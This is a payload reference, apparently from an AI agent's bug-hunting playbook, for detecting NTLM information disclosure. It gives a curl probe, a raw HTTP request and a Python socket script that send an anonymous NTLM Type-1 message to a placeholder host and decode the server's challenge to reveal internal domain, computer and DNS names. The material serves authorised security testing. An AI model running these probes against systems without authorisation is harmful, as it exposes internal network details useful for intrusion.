# Payloads — NTLM information disclosure hunting

Payload lists and probe banks. Methodology and usage are in the parent SKILL.md.

## Payload references from upstream skills (deduplicated)

### hunting / references/payloads.md

# ntlm-info — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payload & Detection Patterns



**Generic NTLM Type-1 anonymous probe (curl + raw socket fallback):**

```bash

# Most one-shot curl runs DON'T return Type-2 because the connection closes.

# Use this as a quick probe to confirm NTLM is offered:

curl -sk -I -H "Authorization: NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==" \

  "https://target.example/_api/web/CurrentUser" 2>&1 | grep -i "WWW-Authenticate"

```



**Burp `send_http1_request` (recommended for full Type-2 capture):**

```

GET /_api/web/CurrentUser HTTP/1.1

Host: target.example

Authorization: NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==

Connection: keep-alive

User-Agent: Mozilla/5.0



```



**Python raw socket + AV_PAIR decoder:**

```python

import socket, ssl, base64, struct, re

from datetime import datetime, timezone



HOST = "target.example"

ctx = ssl.create_default_context()

ctx.check_hostname = False

ctx.verify_mode = ssl.CERT_NONE



s = ctx.wrap_socket(socket.create_connection((HOST, 443)), server_hostname=HOST)

s.sendall(

    f"GET /_api/web/CurrentUser HTTP/1.1\r\n"

    f"Host: {HOST}\r\n"

    "Authorization: NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==\r\n"

    "User-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n".encode()

)

data = b""

while True:

    chunk = s.recv(8192)

    if not chunk: break

    data += chunk

    if b"\r\n\r\n" in data: break



m = re.search(rb"WWW-Authenticate:\s*NTLM\s+([A-Za-z0-9+/=]{20,})", data, re.I)

if m:

    b = base64.b64decode(m.group(1).decode("ascii"))

    assert b[:8] == b"NTLMSSP\x00"

    tn_len, _, tn_off = struct.unpack_from('<HHI', b, 12)

    ti_len, _, ti_off = struct.unpack_from('<HHI', b, 40)

    print(f"TargetName: {b[tn_off:tn_off+tn_len].decode('utf-16-le', errors='ignore')!r}")

    av_types = {1:'NetBIOS Computer Name', 2:'NetBIOS Domain Name',

                3:'DNS Computer Name', 4:'DNS Domain Name',

                5:'DNS Tree Name', 7:'Timestamp', 9:'Target Name'}

    i = 0

    ti = b[ti_off:ti_off+ti_len]

    while i < len(ti):

        av_id, av_len = struct.unpack_from('<HH', ti, i)

        if av_id == 0: break

        val = ti[i+4:i+4+av_len]

        if av_id == 7:

            ts = struct.unpack('<Q', val[:8])[0]

            secs = (ts - 116444736000000000) / 10000000

            vs = datetime.fromtimestamp(secs, tz=timezone.utc).isoformat()

        else:

            vs = val.decode('utf-16-le', errors='ignore')

        print(f"  AV[{av_id}] {av_types.get(av_id, '?'):28s}: {vs!r}")

        i += 4 + av_len

```



**Burp Collaborator NOT needed** for this finding class — the data leak is in the synchronous response, not via OOB.



---
